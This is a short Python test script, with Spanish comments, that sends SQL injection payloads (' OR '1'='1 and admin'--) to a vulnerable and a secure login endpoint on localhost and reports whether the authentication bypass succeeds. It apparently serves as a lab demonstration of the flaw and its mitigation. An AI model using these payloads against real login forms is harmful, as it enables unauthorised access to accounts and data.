import requests

URL_VULNERABLE = "http://127.0.0.1:5000/login-vulnerable"
URL_SEGURO = "http://127.0.0.1:5000/login-seguro"

# Payloads de inyección SQL
payload_bypass = "' OR '1'='1"
payload_comment = "admin'--"

def probar_ataque(url, nombre_escenario):
    print(f"\n--- Probando en: {nombre_escenario} ---")
    data = {
        'username': payload_bypass,
        'password': 'password_incorrecta'
    }
    
    try:
        response = requests.post(url, data=data)
        if "¡Acceso concedido!" in response.text:
            print(f"[!] ATAQUE EXITOSO: Se logró el bypass de autenticación con el payload: {payload_bypass}")
        else:
            print(f"[+] MITIGADO / BLOQUEADO: El sistema rechazó la inyección SQL.")
    except Exception as e:
        print(f"[-] Error al conectar con el servidor: {e}")

if __name__ == '__main__':
    print("=== SCRIPT DE PRUEBA DE ATAQUE SQL INJECTION ===")
    probar_ataque(URL_VULNERABLE, "Entorno Vulnerable (/login-vulnerable)")
    probar_ataque(URL_SEGURO, "Entorno Seguro (/login-seguro)")